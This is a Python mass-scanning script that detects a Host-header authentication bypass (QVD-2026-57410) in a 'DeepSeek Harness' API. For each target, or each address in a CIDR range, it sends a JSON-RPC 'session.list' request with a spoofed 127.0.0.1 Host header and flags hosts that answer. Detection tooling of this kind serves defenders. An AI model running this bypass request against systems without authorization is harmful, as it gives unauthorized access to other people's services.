#!/usr/bin/env python3
"""
DeepSeek Harness Mass Scanner
Batch vulnerability detection tool for QVD-2026-57410

Author: Security Research Team
Date: 2026-02-25
"""

import argparse
import concurrent.futures
import json
import sys
from typing import List, Dict
import urllib3

try:
    import requests
except ImportError:
    print("[!] Error: requests library not found. Install with: pip install requests")
    sys.exit(1)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DSHScanner:
    def __init__(self, timeout: int = 5, threads: int = 10):
        """
        Initialize scanner
        
        Args:
            timeout: Request timeout in seconds
            threads: Number of concurrent threads
        """
        self.timeout = timeout
        self.threads = threads
        self.vulnerable_hosts = []
        
    def check_host(self, target: str) -> Dict:
        """
        Check if a single host is vulnerable
        
        Args:
            target: Target URL or IP:port
            
        Returns:
            Dictionary with scan results
        """
        # Normalize target URL
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
            
        result = {
            "target": target,
            "vulnerable": False,
            "status": "unknown",
            "version": None,
            "error": None
        }
        
        try:
            # Try to access API with spoofed Host header
            response = requests.post(
                f"{target}/api",
                headers={
                    "Host": "127.0.0.1",
                    "Content-Type": "application/json"
                },
                json={
                    "jsonrpc": "2.0",
                    "method": "session.list",
                    "params": {},
                    "id": 1
                },
                timeout=self.timeout,
                verify=False
            )
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if "result" in data:
                        result["vulnerable"] = True
                        result["status"] = "vulnerable"
                        
                        # Try to detect version
                        if "version" in data:
                            result["version"] = data["version"]
                            
                except json.JSONDecodeError:
                    result["status"] = "invalid_response"
                    
            else:
                result["status"] = f"http_{response.status_code}"
                
        except requests.exceptions.ConnectionError:
            result["status"] = "connection_failed"
            result["error"] = "Connection refused or host unreachable"
        except requests.exceptions.Timeout:
            result["status"] = "timeout"
            result["error"] = f"Request timeout after {self.timeout}s"
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
            
        return result
        
    def scan_targets(self, targets: List[str]) -> List[Dict]:
        """
        Scan multiple targets concurrently
        
        Args:
            targets: List of target URLs/IPs
            
        Returns:
            List of scan results
        """
        print(f"[*] Starting scan of {len(targets)} targets with {self.threads} threads...")
        print(f"[*] Timeout: {self.timeout}s per target")
        print("-" * 60)
        
        results = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_target = {executor.submit(self.check_host, target): target for target in targets}
            
            completed = 0
            for future in concurrent.futures.as_completed(future_to_target):
                result = future.result()
                results.append(result)
                completed += 1
                
                # Print real-time results
                status_symbol = "+" if result["vulnerable"] else "-"
                status_color = "\033[92m" if result["vulnerable"] else "\033[91m"
                reset_color = "\033[0m"
                
                print(f"[{status_color}{status_symbol}{reset_color}] [{completed}/{len(targets)}] {result['target']:40s} - {result['status']}")
                
                if result["vulnerable"]:
                    self.vulnerable_hosts.append(result)
                    
        return results
        
    def print_summary(self, results: List[Dict]):
        """Print scan summary"""
        print("\n" + "=" * 60)
        print("SCAN SUMMARY")
        print("=" * 60)
        
        total = len(results)
        vulnerable = len(self.vulnerable_hosts)
        
        print(f"Total targets scanned: {total}")
        print(f"Vulnerable hosts:      {vulnerable}")
        print(f"Success rate:          {vulnerable/total*100:.1f}%" if total > 0 else "N/A")
        
        if self.vulnerable_hosts:
            print("\n" + "=" * 60)
            print("VULNERABLE HOSTS")
            print("=" * 60)
            for host in self.vulnerable_hosts:
                print(f"[!] {host['target']}")
                if host['version']:
                    print(f"    Version: {host['version']}")
                    
        print("=" * 60)
        
    def export_results(self, results: List[Dict], output_file: str):
        """
        Export results to JSON file
        
        Args:
            results: Scan results
            output_file: Output file path
        """
        try:
            with open(output_file, 'w') as f:
                json.dump({
                    "scan_summary": {
                        "total_targets": len(results),
                        "vulnerable_count": len(self.vulnerable_hosts),
                        "timeout": self.timeout,
                        "threads": self.threads
                    },
                    "vulnerable_hosts": self.vulnerable_hosts,
                    "all_results": results
                }, f, indent=2)
                
            print(f"[+] Results exported to: {output_file}")
        except Exception as e:
            print(f"[!] Failed to export results: {e}")


def load_targets_from_file(filepath: str) -> List[str]:
    """
    Load targets from file (one per line)
    
    Args:
        filepath: Path to targets file
        
    Returns:
        List of targets
    """
    try:
        with open(filepath, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return targets
    except FileNotFoundError:
        print(f"[!] Error: File not found: {filepath}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        sys.exit(1)


def generate_target_list(ip_range: str, port: int) -> List[str]:
    """
    Generate target list from IP range
    
    Args:
        ip_range: IP range in CIDR notation (e.g., 192.168.1.0/24)
        port: Target port
        
    Returns:
        List of targets
    """
    try:
        from ipaddress import ip_network
    except ImportError:
        print("[!] Error: ipaddress module not available")
        sys.exit(1)
        
    try:
        network = ip_network(ip_range, strict=False)
        targets = [f"http://{str(ip)}:{port}" for ip in network.hosts()]
        return targets
    except ValueError as e:
        print(f"[!] Invalid IP range: {e}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="DeepSeek Harness Mass Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan from file
  python dsh_scanner.py -f targets.txt
  
  # Scan IP range
  python dsh_scanner.py --range 192.168.1.0/24 --port 3000
  
  # Scan specific targets
  python dsh_scanner.py -t http://target1:3000 http://target2:3000
  
  # Export results
  python dsh_scanner.py -f targets.txt -o results.json
  
  # Aggressive scan (more threads, shorter timeout)
  python dsh_scanner.py -f targets.txt --threads 50 --timeout 3
        """
    )
    
    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument("-f", "--file", help="File containing targets (one per line)")
    input_group.add_argument("-t", "--targets", nargs='+', help="Space-separated list of targets")
    input_group.add_argument("--range", help="IP range in CIDR notation (e.g., 192.168.1.0/24)")
    
    parser.add_argument("--port", type=int, default=3000, help="Target port (default: 3000, used with --range)")
    parser.add_argument("--timeout", type=int, default=5, help="Request timeout in seconds (default: 5)")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
    parser.add_argument("-o", "--output", help="Output file for results (JSON format)")
    
    args = parser.parse_args()
    
    # Load targets
    if args.file:
        targets = load_targets_from_file(args.file)
    elif args.targets:
        targets = args.targets
    elif args.range:
        targets = generate_target_list(args.range, args.port)
    else:
        parser.print_help()
        sys.exit(1)
        
    if not targets:
        print("[!] No targets to scan")
        sys.exit(1)
        
    # Initialize scanner
    scanner = DSHScanner(timeout=args.timeout, threads=args.threads)
    
    # Run scan
    try:
        results = scanner.scan_targets(targets)
        scanner.print_summary(results)
        
        # Export results
        if args.output:
            scanner.export_results(results, args.output)
            
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(1)


if __name__ == "__main__":
    main()
